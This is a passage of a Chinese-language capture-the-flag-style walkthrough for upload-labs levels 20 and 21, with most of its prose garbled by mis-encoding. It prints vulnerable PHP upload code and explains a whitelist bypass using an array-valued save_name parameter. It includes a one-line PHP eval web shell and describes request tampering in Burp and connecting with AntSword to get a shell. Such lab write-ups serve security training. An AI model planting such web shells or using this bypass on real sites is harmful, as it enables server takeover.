æ³¨æ„ï¼š<code>%00</code>æˆªæ–­éœ€è¦<code>gpc</code>å…³é—­ï¼ŒæŠ“åŒ…ï¼Œè§£ç ï¼Œæäº¤å³å¯ï¼Œæˆªæ–­æ–‡ä»¶å<code>php</code>ç‰ˆæœ¬å°äº<code>5.3.4</code>æ‰è¡Œ



+ <code>burpsuite</code>æ”¾åŒ…åç”¨å³é”®æ‰“å¼€æ–‡ä»¶å¹¶å¤åˆ¶æ–‡ä»¶çš„è·¯å¾„

![Pass20_06](./img/Pass20_06.png)

![Pass20_07](./img/Pass20_07.PNG)



+ ç”¨èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ï¼Œ<code>URL</code>æ˜¯æ–‡ä»¶åœ°å€ï¼Œè¿æ¥å¯†ç æ ¹æ®ä¸Šé¢ç¼–å†™çš„è„šæœ¬

![Pass20_08](./img/Pass20_08.PNG)



+ æˆåŠŸæ·»åŠ æ•°æ®ååŒå‡»æˆåŠŸ<code>getshell</code>

![Pass20_09](./img/Pass20_09.PNG)



## Pass21

+ æŸ¥çœ‹æç¤º

![Pass21_01](./img/Pass21_01.PNG)



+ æŸ¥çœ‹æºä»£ç 

~~~ php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //æ£€æŸ¥MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!";
    }else{
        //æ£€æŸ¥æ–‡ä»¶å
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼";
                $is_upload = true;
            } else {
                $msg = "æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼";
            }
        }
    }
}else{
    $msg = "è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼";
}
~~~

![Pass21_02](./img/Pass21_02.PNG)



+ åŸç†

~~~ tex
è¿™ä¸€å…³ç™½åå•éªŒè¯è¿‡ç¨‹ï¼š
--> éªŒè¯ä¸Šä¼ è·¯å¾„æ˜¯å¦å­˜åœ¨
--> éªŒè¯['upload_file']çš„content-typeæ˜¯å¦åˆæ³•ï¼ˆå¯ä»¥æŠ“åŒ…ä¿®æ”¹ï¼‰
--> åˆ¤æ–­POSTå‚æ•°æ˜¯å¦ä¸ºç©ºå®šä¹‰$fileå˜é‡ï¼ˆå…³é”®ï¼šæ„é€ æ•°ç»„ç»•è¿‡ä¸‹ä¸€æ­¥çš„åˆ¤æ–­ï¼‰
--> åˆ¤æ–­fileä¸æ˜¯æ•°ç»„åˆ™ä½¿ç”¨explode('.', strtolower($file))å¯¹fileè¿›è¡Œåˆ‡å‰²ï¼Œå°†fileå˜ä¸ºä¸€ä¸ªæ•°ç»„

ä¾‹å¦‚æˆ‘ä¸Šä¼ upload.php.jpgï¼Œå°±ä¼šè¿”å›æ•°ç»„ array(3){[0]=>upload,[1]=>php,[2]=>jpg}
--> åˆ¤æ–­æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ç™½åå•ä¸­ ç”±äºæ˜¯ç™½åå•æ ¡éªŒ æ‰€ä»¥ä¸èƒ½åˆ©ç”¨ $_FILES['upload_file']['name'] 
--> æ•°ç»„ç¬¬ä¸€ä½å’Œ$file[count($file) - 1]è¿›è¡Œæ‹¼æ¥ï¼Œå‡1æ˜¯å› ä¸ºæ•°ç»„ä¸‹æ ‡é»˜è®¤ä»0å¼€å§‹ æœ€åä¿å­˜æ–‡ä»¶åfile_name
--> ä¸Šä¼ æ–‡ä»¶
~~~

~~~ php
explode(separator,string[,limit]) å‡½æ•°ï¼Œä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚
end(array)å‡½æ•°ï¼Œè¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œæœ€åä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚
reset(array)å‡½æ•°ï¼ŒæŠŠæ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¿™ä¸ªå…ƒç´ çš„å€¼
count(array)å‡½æ•°ï¼Œè®¡ç®—æ•°ç»„ä¸­çš„å•å…ƒæ•°ç›®ï¼Œæˆ–å¯¹è±¡ä¸­çš„å±æ€§ä¸ªæ•°
~~~



+ å®ç°åŸç†

~~~ tex
æƒ³è¦ç»•è¿‡ç™½åå•ä¸Šä¼ ï¼Œå¾ˆæ˜æ˜¾éœ€è¦ä½¿end($file)å’Œ$file[count($file)-1]æŒ‡å‘ä¸åŒçš„å†…å®¹ï¼Œ
end($file)æ˜¯åˆæ³•çš„åç¼€ç”¨äºéª—è¿‡ç™½åå•ï¼Œè€Œ$file[count($file)-1]æ˜¯å®é™…ä¸Šä¼ çš„åç¼€
é‚£æ€æ ·æ‰èƒ½è®©æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ å’Œ$file[count($file)-1]ä¸ä¸€æ ·å‘¢ï¼Ÿ
ç”±äºexplodeå‡½æ•°åªèƒ½åˆ†å‰²å­—ç¬¦ä¸² é‚£ä¹ˆç”¨$_POST['save_name']ä¸Šä¼ ä¸€ä¸ªæ•°ç»„å°±ç»•è¿‡äº†è¿™æ®µä»£ç  
 
 
$file = empty($_POST['save_name'])?$_FILES['upload_file']['name'] : $_POST['save_name'];
if (!is_array($file)) {
	$file = explode('.', strtolower($file));
}


å´æˆä¸ºäº†$fileæ•°ç»„é‚£ä¹ˆè®©æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ä¸ºåˆæ³•åç¼€

array(3){
['save_name']â€‹â€‹â€‹â€‹â€‹â€‹â€‹[0]=>upload.php
['save_name']â€‹â€‹â€‹â€‹â€‹â€‹â€‹[2]=>jpg
}
æ­£å¸¸æ¥è¯´ end($file)=$file[count($file) - 1]  
ä½†æˆ‘æ²¡æœ‰ä¸Šä¼ ä¸‹æ ‡ä¸º['save_name']â€‹â€‹â€‹â€‹â€‹â€‹â€‹[1]=>xxxçš„æ•°ç»„å…ƒç´  æ‰€ä»¥2-1=1 æ•°ç»„å…ƒç´ ä¸ºç©º
é‚£ä¹ˆ$file_name = reset($file) . '.' . $file[count($file) - 1]; ä¿å­˜æˆäº†upload.phpç©ºå­—ç¬¦ ä¹Ÿå°±æ˜¯upload.php 
ä»è€Œå®ç°äº†ç»•è¿‡ç™½åå•
~~~



+ ç¼–å†™è„šæœ¬<code>TwentyOneSecondMethod.php</code>

~~~ php
<?php
	@eval($_POST['TwentyOne']);
?>
~~~



+ ä¸Šä¼ è„šæœ¬<code>TwentyOneFirstMethod.php</code>åˆ°ç½‘ç«™å¹¶ç”¨<code>burpsuite</code>æ‹¦æˆª

![Pass21_03](./img/Pass21_03.PNG)

![Pass21_04](./img/Pass21_04.PNG)



+ ä¿®æ”¹æŸäº›åœ°æ–¹

~~~ tex
æˆ‘ä»¬è¦æ”¹çš„å°±æ˜¯ä¸‹é¢çš„åœ°æ–¹

ä¿®æ”¹content-type 
ä¿®æ”¹POSTå‚æ•°ä¸ºæ•°ç»„ç±»å‹ï¼Œç´¢å¼•[0]ä¸º`upload-20.php`ï¼Œç´¢å¼•[2]ä¸º`jpg|png|gif`ã€‚
åªè¦ç¬¬äºŒä¸ªç´¢å¼•`ä¸ä¸º1`ï¼Œ$file[count($file) - 1]å°±ç­‰ä»·äº$file[2-1]ï¼Œå€¼ä¸ºç©º
~~~

![Pass21_05](./img/Pass21_05.PNG)



+ æ”¾åŒ…ä¹‹åæˆåŠŸä¸Šä¼ æ–‡ä»¶

![Pass21_06](./img/Pass21_06.png)



+ å³é”®æ‰“å¼€ä¸Šä¼ æ–‡ä»¶çš„åœ°å€å¹¶å¤åˆ¶åœ°å€

![Pass21_07](./img/Pass21_07.png)

![Pass21_08](./img/Pass21_08.png)



+ èšå‰‘æ·»åŠ æ•°æ®å¹¶é…ç½®ï¼Œ<code>URLåœ°å€</code>æŒ‡ä¹‹å‰ä¸Šä¼ æ–‡ä»¶çš„åœ°å€ï¼Œè¿æ¥å¯†ç æ ¹æ®ä¹‹å‰ç¼–è¾‘çš„è„šæœ¬ç¡®å®š

![Pass21_09](./img/Pass21_09.png)



+ æˆåŠŸé…ç½®æ•°æ®åæ·»åŠ æ•°æ®æˆåŠŸï¼ŒåŒå‡»åæˆåŠŸ<code>getshell</code>

![Pass21_10](./img/Pass21_10.PNG)

![Pass21_11](./img/Pass21_11.PNG)
